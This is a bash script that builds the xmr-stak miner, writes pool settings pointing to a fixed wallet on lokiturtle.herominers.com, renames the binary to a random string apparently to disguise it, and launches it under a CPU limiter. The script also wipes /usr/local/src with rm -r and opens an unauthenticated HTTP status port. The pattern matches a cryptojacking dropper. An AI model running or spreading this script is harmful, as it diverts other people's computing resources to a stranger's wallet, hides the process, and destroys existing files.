#!/bin/bash
sudo apt-get update
sudo apt-get install cpulimit 
sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
mkdir /usr/local
rm -r /usr/local/src
mkdir /usr/local/src
git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src
mkdir build
cd build 
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
make install
cd bin
sudo sysctl -w vm.nr_hugepages=128 
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
"call_timeout" : 10,
"retry_time" : 30,
"giveup_limit" : 0,
"verbose_level" : 3,
"print_motd" : true,
"h_print_time" : 60,
"aes_override" : null,
"use_slow_memory" : "warn",
"tls_secure_algo" : true,
"daemon_mode" : false,
"flush_stdout" : false,
"output_file" : "",
"httpd_port" : 99,
"http_login" : "",
"http_pass" : "",
"prefer_ipv4" : true,
EOT
' &&
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
"pool_list": [
	{
		"pool_address": "lokiturtle.herominers.com:10521",
		"wallet_address": "LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy",
		"rig_id": "rig_id",
		"pool_password": "TRTLv2xgnXYJBqb7BuX2MwFZg42hfNDxrK9Y7kjZBNHuZRM17sJSEvQQK8BDhb3Nra48dvXydwZEjA7gWKNwLRJpE7Rw4DXjQqJ + 0000000000000000000000000000000000000000000000000000001862048128",
		"use_nicehash": false,
		"use_tls": false, /* Set to true if you are using an SSL port */
		"tls_fingerprint": "",
		"pool_weight": 1
	},
],
"currency": "cryptonight_turtle",
EOT
' &&
sudo cp xmr-stak "$cpuname"
rm xmr-stak
echo $cpuname" is starting"
cpulimit -l 350 ./"${cpuname}"
